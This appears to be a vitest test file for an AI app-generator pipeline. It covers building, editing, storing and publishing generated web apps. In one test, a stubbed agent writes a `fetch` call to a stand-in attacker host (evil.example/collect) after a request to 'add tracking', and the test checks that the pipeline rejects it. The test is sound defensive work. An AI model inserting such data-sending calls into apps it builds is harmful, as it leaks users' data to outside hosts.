import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { loadConfig, type Config } from '../src/config.js'
import { createPipeline, type Reporter } from '../src/pipeline.js'
import { AppGone, type PublishHooks } from '../src/publish.js'
import type { AgentRun } from '../src/sandbox.js'
import { Store } from '../src/store.js'

const HOUR = 3_600_000
const page = (body: string) => `<!doctype html><html><head><title>t</title></head><body>${body}<script src="app.js"></script></body></html>`

let dir: string
let cfg: Config
let store: Store
let runs: AgentRun[]
let published: { appId: string; jobId: string; html: string }[]

// Stands in for the container: writes into the job's workspace what a test tells it to.
let agent: (workspace: string, run: AgentRun) => void
const run = async (_cfg: Config, job: AgentRun) => {
  runs.push(job)
  agent(join(cfg.DATA_DIR, 'jobs', job.jobId), job)
}
// Stands in for the repository: takes the files and reports the push.
const publish = async (appId: string, jobId: string, files: Map<string, Buffer>, hooks: PublishHooks) => {
  if (!hooks.isLive()) throw new AppGone()
  published.push({ appId, jobId, html: files.get('index.html')!.toString() })
  await hooks.pushed()
  return `https://apps.example/apps/${appId}/`
}
const report: Reporter = { status: () => {}, file: () => {}, note: () => {}, cost: () => {} }
const build = (jobId: string) => createPipeline(cfg, store, run, publish)(store.getJob(jobId)!, report)
const stored = (appId: string, file: string) => join(cfg.DATA_DIR, 'sources', appId, file)

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'ag-pipeline-'))
  cfg = loadConfig({
    DATA_DIR: dir,
    LIBS_DIR: join(import.meta.dirname, '../../sandbox/libs'),
    WEB_ORIGIN: 'https://app-generator.example',
    TURNSTILE_SECRET: 'turnstile-secret',
    IP_HASH_SECRET: 'i'.repeat(32),
    PROXY_SIGNING_SECRET: 'p'.repeat(32),
    // Nothing listens here: the launcher and the cost lookup fail quietly, as they may.
    PROXY_URL: 'http://127.0.0.1:9',
    SANDBOX_LAUNCHER: '/bin/false',
  })
  store = new Store(':memory:')
  runs = []
  published = []
  vi.spyOn(console, 'error').mockImplementation(() => {})
})
afterEach(() => {
  vi.restoreAllMocks()
  rmSync(dir, { recursive: true, force: true })
})

describe('building and changing an app', () => {
  it('keeps the files of an owned app and starts a change from them', async () => {
    store.createJob({ id: 'app1', prompt: 'a counter', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), 'let count = 0')
    }
    expect(await build('app1')).toBe('https://apps.example/apps/app1/')
    expect(runs[0]).toMatchObject({ jobId: 'app1', request: 'a counter', edit: false })
    expect(store.getApp('app1')!.currentJobId).toBe('app1')
    // Stored as the agent wrote it; published with the checker's additions.
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toBe(page('<h1>Counter</h1>'))
    expect(published[0]!.html).toContain('content="app1"')
    expect(existsSync(stored('app1', 'lib'))).toBe(false)

    store.createJob({ id: 'job2', appId: 'app1', prompt: 'call it Tally', ipHash: 'h', userId: 'user-anna' })
    agent = (workspace) => {
      // The change finds the last build in its workspace, next to the libraries.
      expect(readFileSync(join(workspace, 'index.html'), 'utf8')).toBe(page('<h1>Counter</h1>'))
      expect(readFileSync(join(workspace, 'app.js'), 'utf8')).toBe('let count = 0')
      expect(existsSync(join(workspace, 'lib', 'qrcode.js'))).toBe(true)
      writeFileSync(join(workspace, 'index.html'), page('<h1>Tally</h1>'))
    }
    expect(await build('job2')).toBe('https://apps.example/apps/app1/')
    expect(runs[1]).toMatchObject({ jobId: 'job2', request: 'call it Tally', edit: true })
    expect(published[1]).toMatchObject({ appId: 'app1', jobId: 'job2' })
    expect(published[1]!.html).toContain('<h1>Tally</h1>')
    expect(published[1]!.html).toContain('src="app.js?v=job2"')
    expect(store.getApp('app1')!.currentJobId).toBe('job2')
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toBe(page('<h1>Tally</h1>'))
    expect(readFileSync(stored('app1', 'app.js'), 'utf8')).toBe('let count = 0')
    expect(existsSync(join(cfg.DATA_DIR, 'jobs', 'job2'))).toBe(false)
  })

  it('keeps nothing of an app without an owner', async () => {
    store.createJob({ id: 'anon1', prompt: 'a counter', ipHash: 'h', expiresAt: Date.now() + 24 * HOUR })
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), '1')
    }
    await build('anon1')
    expect(published).toHaveLength(1)
    expect(store.getApp('anon1')!.currentJobId).toBeNull()
    expect(existsSync(join(cfg.DATA_DIR, 'sources'))).toBe(false)
  })

  it('does not start a change without the files to start from, nor publish one for an app that has ended', async () => {
    store.createJob({ id: 'app1', prompt: 'a counter', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
    store.createJob({ id: 'job2', appId: 'app1', prompt: 'call it Tally', ipHash: 'h', userId: 'user-anna' })
    agent = () => expect.unreachable('the agent must not run')
    await expect(build('job2')).rejects.toThrow(AppGone)
    expect(runs).toHaveLength(0)

    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), '1')
    }
    await build('app1')
    // The app ends while its change is being built.
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Tally</h1>'))
      store.setStatus('app1', 'failed')
    }
    await expect(build('job2')).rejects.toThrow(AppGone)
    expect(published).toHaveLength(1)
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toBe(page('<h1>Counter</h1>'))
  })

  it('does not publish a change the checker rejects, and leaves the stored files alone', async () => {
    store.createJob({ id: 'app1', prompt: 'a counter', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), '1')
    }
    await build('app1')
    store.createJob({ id: 'job2', appId: 'app1', prompt: 'add tracking', ipHash: 'h', userId: 'user-anna' })
    agent = (workspace) => writeFileSync(join(workspace, 'app.js'), 'fetch("https://evil.example/collect")')
    await expect(build('job2')).rejects.toThrow(/external URLs are not allowed/)
    // Asked once, then once more with the checker's findings.
    expect(runs.slice(1).map((r) => r.problems?.length ?? 0)).toEqual([0, 1])
    expect(published).toHaveLength(1)
    expect(store.getApp('app1')!.currentJobId).toBe('app1')
    expect(readFileSync(stored('app1', 'app.js'), 'utf8')).toBe('1')
  })
})
